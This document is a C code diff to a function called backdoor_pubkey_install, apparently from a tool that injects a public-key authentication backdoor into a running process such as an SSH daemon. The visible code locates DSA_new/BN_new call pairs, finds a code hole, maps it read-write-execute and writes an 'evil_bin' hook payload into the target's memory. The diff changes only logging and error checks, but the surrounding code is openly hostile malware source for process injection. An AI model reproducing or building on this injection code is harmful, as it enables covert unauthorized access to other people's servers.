@@ -35,6 +35,8 @@ void backdoor_pubkey_install(inject_ctx *ctx) {
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
 	u64 diff=0, hole_addr=0, *import_table;
 
+	mod_banner("installing pubkey backdoor");
+
 	evil_bin = malloc(hook_pubkey_bin_len);
 	import_table = (u64*)(evil_bin + 8);
 
@@ -64,7 +66,9 @@ void backdoor_pubkey_install(inject_ctx *ctx) {
 
 					callpair = find_callpair(p_dsa_new, p_bn_new);
 
-					info("yo we got a callpair for (DSA_new, BN_new) -> 0x%lx", callpair);
+					if (callpair == 0) {
+						error("could not find a (DSA_new, BN_new) callpair!");
+					}
 
 					signatures[i].addr = find_entrypoint(callpair);
 				break;
@@ -152,8 +156,6 @@ void backdoor_pubkey_install(inject_ctx *ctx) {
 
 	info("found usable hole @ 0x%lx", hole_addr);
 
-	info2("entering critical phase");
-
 	_mmap(
 		ctx, (void*)hole_addr, 0x1000,
 		PROT_READ| PROT_WRITE | PROT_EXEC,
@@ -174,6 +176,4 @@ void backdoor_pubkey_install(inject_ctx *ctx) {
 	}
 
 	_poke(ctx->pid, hole_addr, evil_bin, hook_pubkey_bin_len);
-
-	info("poked evil_bin to 0x%lx.", hole_addr);
 }
